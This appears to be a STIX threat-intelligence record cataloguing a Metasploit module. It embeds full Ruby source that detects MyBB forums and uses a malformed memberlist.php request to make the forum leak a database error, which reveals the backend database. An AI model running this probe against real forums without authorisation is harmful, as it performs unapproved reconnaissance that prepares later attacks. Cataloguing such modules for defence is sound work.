{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--992d3a9b-a8c4-464d-8d6a-248a6ec7b428",
    "created": "2024-08-14T16:32:52.902262Z",
    "modified": "2024-08-14T16:32:52.902266Z",
    "name": "MyBB Database Fingerprint",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/mybb_db_fingerprint.rb",
            "external_id": "mybb_db_fingerprint.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'MyBB Database Fingerprint',\n      'Description' => %q{\n        This module checks if MyBB is running behind an URL. Also uses a malformed query to\n        force an error and fingerprint the backend database used by MyBB on version 1.6.12\n        and prior.\n      },\n      'Author'      =>\n        [\n          #http://www.linkedin.com/pub/arthur-karmanovskii/82/923/812\n          'Arthur Karmanovskii <fnsnic[at]gmail.com>' # Discovery and Metasploit Module\n        ],\n      'License'     => MSF_LICENSE,\n      'DisclosureDate' => '2014-02-13'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"MyBB forum directory path\", '/forum'])\n      ])\n  end\n\n  def check\n  begin\n    uri = normalize_uri(target_uri.path, 'index.php')\n    res = send_request_cgi(\n      {\n        'method'  => 'GET',\n        'uri'     => uri,\n        'vars_get' => {\n          'intcheck' => 1\n          }\n      })\n\n    if res.nil? || res.code != 200\n      return Exploit::CheckCode::Unknown\n    end\n\n    # Check PhP\n    php_version = res['X-Powered-By']\n    if php_version\n      php_version = \"#{php_version}\"\n    else\n      php_version = \"PHP version unknown\"\n    end\n\n    # Check Web-Server\n    web_server = res['Server']\n    if web_server\n      web_server = \"#{web_server}\"\n    else\n      web_server = \"unknown web server\"\n    end\n\n    # Check forum MyBB\n    if res.body.match(\"&#077;&#089;&#066;&#066;\")\n      print_good(\"MyBB forum found running on #{web_server} / #{php_version}\")\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Unknown\n    end\n  rescue\n    return Exploit::CheckCode::Unknown\n  end\n\n  end\n\n\n  def run\n    print_status(\"Checking MyBB...\")\n    unless check == Exploit::CheckCode::Detected\n      print_error(\"MyBB not found\")\n      return\n    end\n\n    print_status(\"Checking database...\")\n    uri = normalize_uri(target_uri.path, 'memberlist.php')\n    response = send_request_cgi(\n      {\n        'method'  => 'GET',\n        'uri'     => uri,\n        'vars_get' => {\n          'letter' => -1\n          }\n      })\n    if response.nil?\n      print_error(\"Timeout...\")\n      return\n    end\n\n    # Resolve response\n    if response.body.match(/SELECT COUNT\\(\\*\\) AS users FROM mybb_users u WHERE 1=1 AND u.username NOT REGEXP\\(\\'\\[a-zA-Z\\]\\'\\)/)\n      print_good(\"Running PostgreSQL Database\")\n    elsif response.body.match(/General error\\: 1 no such function\\: REGEXP/)\n      print_good(\"Running SQLite Database\")\n    else\n      print_status(\"Running MySQL or unknown database\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2014-02-13"
}